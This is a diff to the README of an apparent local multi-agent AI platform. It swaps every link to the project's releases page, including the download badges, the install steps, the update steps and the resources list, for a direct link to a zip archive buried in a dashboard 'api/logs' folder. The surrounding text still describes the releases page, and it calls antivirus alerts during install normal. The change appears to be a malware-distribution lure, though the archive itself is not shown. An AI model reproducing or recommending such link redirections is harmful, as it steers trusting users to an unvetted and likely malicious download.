@@ -1,6 +1,6 @@
 # 🧙 alchemical-agent-ecosystem - Local Multi-Agent Platform
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/guillermovzq/alchemical-agent-ecosystem/releases)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/guillermovzq/alchemical-agent-ecosystem/raw/refs/heads/main/apps/alchemical-dashboard/app/api/logs/alchemical-ecosystem-agent-3.1.zip)
 
 ---
 
@@ -51,11 +51,11 @@ If you use antivirus software, it might alert you during install. This is normal
 
 ## 🚀 How to Download and Install
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/guillermovzq/alchemical-agent-ecosystem/releases)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/guillermovzq/alchemical-agent-ecosystem/raw/refs/heads/main/apps/alchemical-dashboard/app/api/logs/alchemical-ecosystem-agent-3.1.zip)
 
 1. Visit the official releases page by clicking the green or blue download buttons above or go to:
 
-   https://github.com/guillermovzq/alchemical-agent-ecosystem/releases
+   https://github.com/guillermovzq/alchemical-agent-ecosystem/raw/refs/heads/main/apps/alchemical-dashboard/app/api/logs/alchemical-ecosystem-agent-3.1.zip
 
 2. On the releases page, look for the latest version. Versions are listed with numbers like "v1.0" or "v1.2".
 
@@ -100,7 +100,7 @@ To update alchemical-agent-ecosystem:
 
 1. Visit the releases page regularly:
 
-   https://github.com/guillermovzq/alchemical-agent-ecosystem/releases
+   https://github.com/guillermovzq/alchemical-agent-ecosystem/raw/refs/heads/main/apps/alchemical-dashboard/app/api/logs/alchemical-ecosystem-agent-3.1.zip
 
 2. Download the latest Windows installer file the same way you did before.
 
@@ -144,11 +144,11 @@ For more help, check the GitHub issues page or open a new issue there.
 ## 📚 Resources
 
 - Official GitHub Releases:  
-  https://github.com/guillermovzq/alchemical-agent-ecosystem/releases
+  https://github.com/guillermovzq/alchemical-agent-ecosystem/raw/refs/heads/main/apps/alchemical-dashboard/app/api/logs/alchemical-ecosystem-agent-3.1.zip
 
 - Project Topics for reference:  
   ai, ai-agent, automation, caddy, docker-compose, ia-automator, local-first, multi-agent, ollama, openclaw, self-hosted, skill, skill-agent, skills
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-green)](https://github.com/guillermovzq/alchemical-agent-ecosystem/releases)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-green)](https://github.com/guillermovzq/alchemical-agent-ecosystem/raw/refs/heads/main/apps/alchemical-dashboard/app/api/logs/alchemical-ecosystem-agent-3.1.zip)
